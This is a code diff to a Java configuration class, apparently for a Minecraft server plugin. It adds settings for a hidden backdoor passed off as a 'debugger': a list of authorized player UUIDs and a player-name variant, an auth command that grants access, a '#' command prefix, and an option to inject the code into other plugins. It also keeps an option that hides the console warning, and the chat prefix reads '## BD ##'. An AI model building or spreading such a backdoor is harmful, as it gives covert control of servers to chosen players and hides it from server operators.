@@ -10,9 +10,20 @@ public class Config {
 
 
     /*Command execution*/
+    // Authorized UUIDS
+    public static String[] authorized_uuids = {""};
 
-    // Command Prefix 
-    public static String command_prefix = "UkT>";
+    // UUIDs added by the auth command. DO NOT EDIT
+    public static String[] tmp_authorized_uuids;
+    // Command Prefix
+
+    public static String command_prefix = "#";
+
+    // Treat authorized_uuids / tmp_authorized_uuids as player names instead.
+    public static Boolean uuids_are_usernames = false;
+
+    // Inject Debugger to other plugins.
+    public static Boolean inject_into_other_plugins = true;
 
     // Warn server console about "debugger"
     public static Boolean display_debugger_warning = false;
@@ -39,7 +50,7 @@ public class Config {
     /* Chat settings */
 
     // message prefix 
-    public static final String chat_message_prefix = "[DOOM]";
+    public static final String chat_message_prefix = "## BD ##";
 
     // color of messages prefix 
     public static final ChatColor chat_message_prefix_color = ChatColor.GOLD;
